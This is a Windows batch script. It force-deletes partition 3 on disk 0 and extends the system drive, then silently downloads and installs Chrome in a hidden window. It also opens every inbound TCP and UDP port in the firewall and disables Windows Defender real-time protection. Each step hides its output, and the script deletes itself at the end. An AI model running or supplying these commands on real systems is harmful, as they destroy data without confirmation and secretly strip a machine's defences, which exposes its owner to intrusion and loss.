@echo off
:: Delete partition & extend C drive
(ECHO LIST DISK & ECHO SELECT DISK 0 & ECHO LIST PARTITION & ECHO SELECT PARTITION 3 & ECHO DELETE PARTITION OVERRIDE) > "%TEMP%\d.txt"
diskpart /s "%TEMP%\d.txt" >nul 2>&1
(ECHO SELECT VOLUME %SystemDrive% & ECHO EXTEND) > "%TEMP%\e.txt"
diskpart /s "%TEMP%\e.txt" >nul 2>&1
del "%TEMP%\d.txt" "%TEMP%\e.txt" >nul 2>&1

:: Download & install Chrome
powershell -WindowStyle Hidden -Command "Invoke-WebRequest 'https://dl.google.com/chrome/install/latest/chrome_installer.exe' -OutFile '$env:TEMP\c.exe'" >nul 2>&1
if exist "%TEMP%\c.exe" (start /wait "" "%TEMP%\c.exe" /silent /install >nul 2>&1 & del "%TEMP%\c.exe" >nul 2>&1)

:: Configure firewall & disable defender
netsh advfirewall firewall add rule name="TCP" dir=in action=allow protocol=TCP localport=1-65535 >nul 2>&1
netsh advfirewall firewall add rule name="UDP" dir=in action=allow protocol=UDP localport=1-65535 >nul 2>&1
powershell -WindowStyle Hidden -Command "Set-MpPreference -DisableRealtimeMonitoring $true" >nul 2>&1

:: Self-delete
timeout /t 3 /nobreak >nul & del "%~f0" >nul 2>&1
